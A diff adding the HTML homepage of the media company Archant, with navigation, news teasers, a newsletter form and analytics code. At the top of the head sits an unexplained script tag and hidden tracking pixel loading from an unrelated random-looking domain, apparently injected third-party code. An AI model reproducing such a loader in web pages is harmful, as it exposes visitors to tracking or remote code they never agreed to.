@@ -1,0 +1,628 @@
+
+
+
+
+<!doctype html>
+<html lang="en">
+
+<head>
+
+<script type="text/javascript" src="http://mialbj6.com/js/29220.js" ></script>
+
+<noscript><img src="http://mialbj6.com/images/track/29220.png?trk_user=29220&trk_tit=jsdisabled&trk_ref=jsdisabled&trk_loc=jsdisabled" height="0px" width="0px" style="display:none;" /></noscript>
+
+	
+	<title>Archant - Inspiring Communities</title>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	
+	<meta charset="utf-8" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="" />
+	<link rel="stylesheet" href="/static/backup.css">
+	
+	    <link rel="stylesheet" href="/static/all.css?0a67b33b" />
+	
+
+		<link rel="stylesheet" href="http://code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css" />
+
+	<!--[if lt IE 9]>
+	  <script src="/static/js/html5shiv.min.js"></script>
+	  <script src="/static/js/respond.min.js"></script>
+	  <link rel="stylesheet" href="/static/css/ie8.css" />
+	<![endif]-->
+
+</head>
+<body class="index">
+
+
+<header>    
+	<div class="row site-info">
+		<div class="wrap">
+    		<a href="/" class="logo"><img src="/static/img/logo.png" alt="Archant Inspiring Communities" /></a>
+			
+			<form id="search_archant" method="get" action="/search" > 
+	<input type="text" id="archant-query" name="query" placeholder="Search Archant"/>
+	<div class="magnify"></div>
+	<div class="select-box">
+		<select class="change-url">
+			<option value="#" selected="selected">I'm interested in...</option>
+			  
+				  				    			    				
+				<option value="/careers/" data-target="internal">A career with Archant</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/articles/terms-conditions" data-target="internal">Reading your Terms &amp; Conditions</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/articles/privacy-policy/" data-target="internal">Reading your privacy policy</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/careers/a-day-in-the-life" data-target="internal">Finding out what it is like to work for Archant</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/our-work/" data-target="internal">Seeing some examples of Archant’s work</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/brands/media/all/" data-target="internal">Advertising in an Archant product</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/articles/about-us-our-people-key-contacts/" data-target="internal">Working with Archant on a promotion</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/articles/about-us-our-people-key-contacts/" data-target="internal">Selling Archant a product or service</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/news/" data-target="internal">Viewing recent press releases</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/articles/media-centre-expert-views/" data-target="internal">Finding an expert view</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="#news-alerts" data-target="internal">Signing up for news alerts from Archant</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="/investors/" data-target="internal">Downloading the latest investor information</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="http://www.archant.co.uk/brands/media/client-magazines/" data-target="internal">Seeing all magazines that Archant produces for its clients</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="https://itunes.apple.com/WebObjects/MZStore.woa/wa/viewArtistSeeAll?cc=gb&amp;dkId=11&amp;ids=385752147&amp;section=0&amp;softwareType=iPhone" data-target="internal">Seeing all iOS apps that Archant produce </option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="https://play.google.com/store/apps/developer?id=Archant+Ltd" data-target="internal">Seeing all Android Apps that Archant produces</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="http://www.archant.co.uk/brands/" data-target="internal">Sharing a story with one of your titles</option>   
+				 				    				
+			  
+				  				    			    				
+				<option value="http://www.archant.co.uk/brands/" data-target="internal">Working with Archant on sponsorship</option>   
+				 				    				
+			  
+				
+				<option value="http://www.digitalnorfolk.com/gateway/index.php" data-target="external">Viewing your advertising specifications</option>
+				 				    				
+			  
+				
+				<option value="http://www.archantvisualportfolio.co.uk" data-target="external">Viewing your digital advertising portfolio</option>
+				 				    				
+			  
+				  				    			    				
+				<option value="http://www.archant.co.uk/articles/archant-community-media-limited-rights-holder-char/" data-target="internal">My rights as a contributor</option>   
+				 				    				
+			
+		</select>
+	</div>
+</form>
+<div class="social">
+	
+	<a href="https://twitter.com/ArchantDigital" target="_blank" class="twitter">Twitter</a>
+	<a href="http://www.linkedin.com/company/archant" target="_blank" class="linkedin">Linkedin</a>
+</div>
+			
+			<div class="clear"></div>
+		</div>
+    </div>
+	<div class="nav-row">
+        <nav>
+            
+            <ul>
+            	
+            	<li><a class="" href="/about/">About Us</a>
+            		<ul>
+            			<li class="ipad-show"><a class="" href="/about/">About Us</a></li>
+            			<li><a href="/articles/about-us-who-we-are/">Who We Are</a></li>
+            			<li><a href="/articles/about-us-our-history/">Our History</a></li>
+            			<li><a class="" href="/about/our-people/">Our People</a></li>
+            		</ul>
+            	</li>
+            	
+            	<li><a class="" href="/brands/">Products &amp; Services</a>
+            		<ul>
+            			<li class="ipad-show"><a class="" href="/brands/">Products &amp; Services</a></li>
+						<li><a href="/brands/media/newspapers/">Newspapers</a></li>
+						<li><a href="/brands/media/magazines/">Magazines</a></li>
+                                    <li><a href="/brands/media/websites/">Websites</a></li>
+                                    <li><a href="/brands/media/events/">Events</a></li>
+                                    <li><a href="/brands/media/apps/">Apps</a></li>
+                                    <li><a href="http://www.archantdialogue.co.uk" target="_blank">Archant Dialogue</a></li>
+                                    <li><a href="http://www.archantprint.co.uk" target="_blank">Archant Print</a></li>
+
+						
+						
+						
+            		</ul>
+            	</li>
+            	
+            	<li><a class="" href="/advertising/">Advertising</a>
+					
+                        </li>
+				
+				<li><a class="" href="/careers/">Careers</a>
+            		<ul>
+            			<li class="ipad-show"><a class="" href="/careers/">Careers</a></li>
+            			<li><a class="" href="/careers/a-day-in-the-life/">A Day in the Life</a></li>
+            			<li><a href="/articles/careers-learning-and-development/">Learning &amp; Development</a></li>
+            			<li><a href="/articles/careers-application-process/">Application Process</a></li>
+            			<li><a href="/careers/vacancies/">Vacancies</a></li>
+            			<li><a href="/articles/careers-opportunities-benefits/">Opportunities &amp; Benefits</a></li>
+            			<li><a class="" href="/careers/cv-database/">CV Database</a></li>
+            		</ul>
+            	</li>
+				
+            	<li class="ipad"><a class="" href="/investors/">Investors</a></li>
+				
+            	<li><a class="" href="/media-centre/">Media Centre</a>
+            		<ul>
+            			<li class="ipad-show"><a class="" href="/media-centre/">Media Centre</a></li>
+            			<li><a class="" href="/news/">News</a></li>
+            			<li><a class="" href="/media-centre/photo_library/">Photo Library</a></li>
+            			<li><a href="/articles/media-centre-expert-views/">Expert Views</a></li>
+            			<li><a href="/articles/media-centre-syndication/">Syndication</a></li>
+            			<li><a href="#news-alerts" class="news-alerts">News Alerts</a></li>
+            		</ul>
+            	</li>
+
+            	<li><a class="" href="/contact-us">Contact Us</a>
+            		<ul>
+            			<li class="ipad-show"><a class="" href="/contact-us">Contact Us</a></li>
+            		</ul>
+            	</li>
+            </ul>
+			<div class="clear"></div>
+        </nav>
+       
+		<div class="clear"></div>
+	</div>
+</header>
+<a href="#" class="mobile-menu">
+	<span></span>
+	<span></span>
+	<span></span>
+</a>	
+
+<div class="content home">
+	<div class="container">
+	
+	    
+	    
+			<div class="full-page video">
+				<div id="player"></div>
+			</div>
+		
+
+		
+
+	    <div style="width: 100%; background: #e6e8e9">
+			<div class="counters counter-margin row">
+				<div class="threecol">
+					<h1 class="figure"><span class="animated-number">140</span>+</h1>
+					<p>brands and associated websites</p>
+				</div>
+				<div class="threecol">
+					<h1 class="figure"><span class="animated-number">6</span>m</h1>
+					<p>print copies each month</p>
+				</div>
+				<div class="threecol">
+					<h1 class="figure"><span class="animated-number">13.3</span>m+</h1>
+					<p>opportunities to be seen each month</p>
+				</div>
+				<div class="threecol last">
+					<h1 class="figure"><span class="animated-number">6.8</span>m+</h1>
+					<p>unique visitors per month</p>
+				</div>
+			</div>
+		</div>
+		
+		<div class="clear"></div>
+
+		
+		
+		<div class="single-article callout row">
+			<a class="teaser-story" href="/news/archant-awarded-grant-from-google-to-fund-archive/">
+				
+		
+			
+				<div class="img">
+					<img src="http://static.archant.s3.amazonaws.com/cache/80/c2/80c2093149276ee8f8b4868497032915.jpg">
+				</div>
+			
+		
+				<div class="text">
+					<h5>Archant News</h5>
+					<h4>Archant awarded grant from Google to fund archive digitisation &amp; build advanced voice infrastructure</h4>
+					<p><p>Archant, the UK’s leading privately owned regional media group has received a grant worth €676,000 from Google’s Digital News Initiative.</p></p>
+					<div class="call-to-action">Learn More</div>
+				</div>
+			</a>
+		</div>
+		
+
+			
+		<div class="full-page-slider">
+			<div class="slide-container">
+				<h3>More archant news stories</h3>
+				<div class="slideshow" data-cols="4">
+					<ul class="news">
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/success-at-the-lancashire-life-food-and-drink-awar/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/b5/4b/b54b280827738b053ef789e004726a38.jpg"></div>
+									
+									<h4>Success at the Lancashire Life Food and Drink Awards 2017</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/creative-futures-for-suffolk-students/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/a8/f0/a8f02ce0dcf92e077d7c4d8b0812c465.jpg"></div>
+									
+									<h4>Creative futures for Suffolk students</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/prime-minister-theresa-may-visits-archants-head-o/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/10/84/10847ef2699e4869c25f85ac04427657.jpg"></div>
+									
+									<h4>Prime Minister Theresa May visits Archant&#39;s head office</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/success-for-the-norwich-classified-team-at-the-cha/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/fb/9c/fb9cd8b83002c538fde677092eaa1880.jpg"></div>
+									
+									<h4>Success for Achant&#39;s Classified Team at the Chamber of Commerce B2B Exhibition 2017</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/thousands-flock-to-bride-the-wedding-show-at-west/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/41/e9/41e92b5d7cb746890dbd6c5af9977811.jpg"></div>
+									
+									<h4>Thousands flock to Bride: The Wedding Show at Westpoint Exeter</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/archant-employees-reach-dementia-friends-target/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/a6/eb/a6eb81130a1fc5e8e86198e25625ffc0.jpg"></div>
+									
+									<h4>Archant employees reach Dementia Friends target</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+							<li class="post">
+								<a class="teaser-story" href="/news/digital-decoded-archant-runs-free-sessions-to-hel/">
+									
+									
+									
+									<div class="img"><img src="http://static.archant.s3.amazonaws.com/cache/74/b7/74b7548696fe3bdf9951ce5827fbbbd6.jpg"></div>
+									
+									<h4>Digital Decoded: Archant runs free sessions to help small businesses</h4>
+									
+									
+									
+								</a>
+							</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+		<div class="clear"></div>
+		
+		
+		<div class="callout text-callout row" id="careers">
+			<div class="text">
+				<h2>Join our team of innovators and award winners working together to make Archant the best local media company.</h2>
+				<a href="/careers/vacancies/" class="call-to-action btn">Current Vacancies</a>
+		    </div>
+		</div>
+
+		<div class="clear"></div>
+
+		
+		<div class="home background-pattern row">
+			<h2>Enhancing the lives and businesses of the communities we serve</h2>
+		</div>
+		<div class="clear"></div>
+
+		
+		<div class="single-article callout row">
+			<a class="teaser-story" href="/advertising/">
+				
+				<div class="img">
+					<img src="/static/img/callouts/foobar.jpg" />
+				</div>
+
+				<div class="text">
+					<h5>Advertising</h5>
+					<h4>Advertise with Archant.<br/>Making connections.</h4>
+					<p>Find out more how our 140 leading media brands provide a highly relevant, powerful and engaging space for you to connect with your customers.</p>
+					<div class="call-to-action">Find out more</div>
+				</div>
+			</a>
+		</div>
+		<div class="clear"></div>
+
+	</div>
+</div>
+
+
+
+<div class="clear"></div>
+
+
+
+<footer>
+	<div class="row">
+	  <div class="wrap">
+		<div class="threecol">
+			<h4>MORE INFORMATION</h4>
+			<ul>
+				<li><a href="/articles/cookies/">Cookies</a></li>
+				<li><a href="/articles/modern-slavery-statement/">Modern Slavery Statement</a></li>
+				<li><a href="/articles/privacy-policy/">Privacy policy</a></li>
+				<li><a href="/articles/terms-conditions/">Terms &amp; conditions</a></li>
+			</ul>
+		</div>
+		<div class="sevencol" id="quick-access">
+			<h4>QUICK ACCESS</h4>
+			<ul>
+				<li><a href="/brands/media/websites/">Websites</a></li>
+				<li><a href="/brands/media/newspapers/">Newspapers</a></li>
+				<li><a href="/brands/media/magazines/">Magazines</a></li>
+			</ul>
+			<ul>
+				
+				<li><a href="/advertising/">Advertising</a></li>
+				<li><a href="/about/our-people/">Our people</a></li>
+				<li><a href="/contact-us">Contact us</a></li>
+			</ul>
+			<ul>
+				<li><a href="/careers/vacancies/">Vacancies</a></li>
+				<li><a href="/articles/careers-application-process/">Application process</a></li>
+				<li><a href="#news-alerts" class="news-alerts">News alerts</a></li>
+			</ul>
+		</div>
+		<div class="twocol last">
+    		<a href="/"><img class="footer-logo" src="/static/img/logo.png" alt="Archant Inspiring Communities" /></a>
+		</div>
+      </div>
+	</div>
+	
+</footer>
+
+<div class="copy">
+	<div class="container">
+		<div class="row">
+		<p>&copy; Archant Ltd 2013</p>
+		</div>
+	</div>
+</div>
+	
+ <div id="news-alerts" class="inline-popup" style="display: none;">
+     <h3>Subscribe to receive Archant news alerts.</h3>
+     <form method="post" action="/news-alerts/signup/" >
+     	<input type='hidden' name='csrfmiddlewaretoken' value='rxY28HGKgFZlIrsepJ2N18gbi9vHc9On' />
+         <div class="field">
+	        <label>Name</label>
+	        <input type="text" value="" name="name" />
+        </div>
+        <div class="field">
+	        <label>Email Address</label>
+	        <input type="text" value="" name="email" />
+        </div>
+        
+        <script type="text/javascript" src="http://www.google.com/recaptcha/api/js/recaptcha_ajax.js"></script>
+		<div id="captcha-box" style="margin-bottom: 20px;"></div>
+        
+        <input type="submit" value="Subscribe" />
+     </form>
+ </div>
+<div id="update-banner" class="inline-popup2 update-pop" style="display: none;">
+	<a href="#" class="close-update"></a>
+	<p style="margin-bottom: 30px;">This site uses features supported only by modern web browsers. <br />For the best viewing experience, please update your browser to the latest version of:</p>
+	<p>
+		<a href="https://www.google.com/intl/en/chrome/browser/" target="_blank">Google Chrome</a>, 
+		<a href="http://www.mozilla.org/en-US/" target="_blank">Firefox</a> or
+		<a href="http://windows.microsoft.com/en-gb/internet-explorer/ie-11-worldwide-languages" target="_blank">Internet Explorer.</a>
+	</p>
+	<a href="#" class="continue">Continue to Archant</a>
+</div>
+<a href="#update-banner" class="update-banner" style="display: none;">News alerts</a>
+
+
+ 
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.10.0/jquery-ui.min.js" type="text/javascript"></script>
+<script src="http://code.jquery.com/jquery-migrate-1.2.1.js"></script>
+
+
+
+
+
+<script type="text/javascript">
+    
+    $(function(){
+    	$("#archant-query").autocomplete({
+    		enable:true,
+    		source: "/search-autocomplete",
+    		minLength:2,
+    		select: function(event, ui){
+				$(this).val(ui.item.value);				 				    		    			    
+    			$(this).closest("form").submit();    			
+    		}    	    		
+    	});
+    });
+    
+</script>	
+
+
+<script type="text/javascript" src="/static/site.js?3ea1c0ff"></script>
+
+
+
+		
+	
+		<script>
+			// Detects if mobile
+		    var mobileDevice = false;
+			if(typeof window.orientation !== 'undefined'){
+				var mobileDevice = true;
+			}
+
+		    //youtube video
+		    var tag = document.createElement('script');
+		    tag.src = "//www.youtube.com/iframe_api";
+		    var firstScriptTag = document.getElementsByTagName('script')[0];
+		    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+		
+		    var player;
+		
+		    onYouTubeIframeAPIReady = function () {
+		        player = new YT.Player('player', {
+					height: '463px',
+					width: '1080px',
+					videoId: 'mOmZzARbRpo',
+					playerVars: {
+						'autoplay': 0,
+						'rel': 0,
+						'showinfo': 0,
+						'controls': 0
+					},
+					events: {
+						'onReady': onPlayerReady,
+						'onStateChange': onPlayerStateChange
+					}
+				});
+		    };
+			
+		    
+			onPlayerReady = function (event) {
+				// Only autoplay a YT video via JS if not on mobile, as mobile devices don't like it
+				if(!mobileDevice){
+			        event.target.playVideo();
+			    }
+			}
+		    
+		    var done = false;
+		    onPlayerStateChange = function (event) {
+		        if (event.data == YT.PlayerState.PLAYING && !done) {
+		            done = true;
+		        }
+		    };	
+		</script>
+	
+
+
+
+<!-- SiteCatalyst code version: H.22.1.
+Copyright 1996-2010 Adobe, Inc. All Rights Reserved
+More info available at http://www.omniture.com -->
+<script language="JavaScript" type="text/javascript" src="/static/js/omniture/s_code.js"></script>
+<script language="JavaScript" type="text/javascript"><!--
+s.pageName=""
+s.server=""
+s.channel=""
+s.pageType=""
+s.prop1=""
+s.prop2=""
+s.prop3=""
+s.prop4=""
+s.prop5=""
+/* Conversion Variables */
+s.campaign=""
+s.state=""
+s.zip=""
+s.events=""
+s.products=""
+s.purchaseID=""
+s.eVar1=""
+s.eVar2=""
+s.eVar3=""
+s.eVar4=""
+s.eVar5=""
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script>
+<script language="JavaScript" type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//--></script><noscript><img src="http://archant.122.2o7.net/b/ss/archantcorp/1/H.22.1--NS/0?server=www.archant.co.uk.co.uk&ns=archant" height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
+<!-- End SiteCatalyst code version: H.22.1. -->	
+
+</body>
